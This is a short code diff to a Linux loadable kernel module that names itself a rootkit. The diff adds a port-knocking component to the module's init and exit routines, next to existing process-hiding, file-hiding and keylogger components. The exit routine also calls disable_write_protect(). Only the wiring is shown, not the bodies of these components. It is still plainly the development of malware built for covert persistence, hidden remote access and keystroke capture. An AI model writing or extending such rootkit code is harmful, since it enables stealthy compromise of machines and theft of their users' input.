@@ -16,7 +16,7 @@ static int __init lkm_rootkit_init(void)
 {
     printk(KERN_INFO "Hello, World!\n");
 
-    if (proc_init() || hidefs_init() || keylogger_init())
+    if (proc_init() || hidefs_init() || keylogger_init() || port_knocking_init())
     {
         proc_clean();
         hidefs_clean();
@@ -56,6 +56,7 @@ static void __exit lmk_rootkit_exit(void)
     proc_clean();
     hidefs_clean();
     keylogger_clean();
+    port_knocking_clean();
 
     disable_write_protect();
 
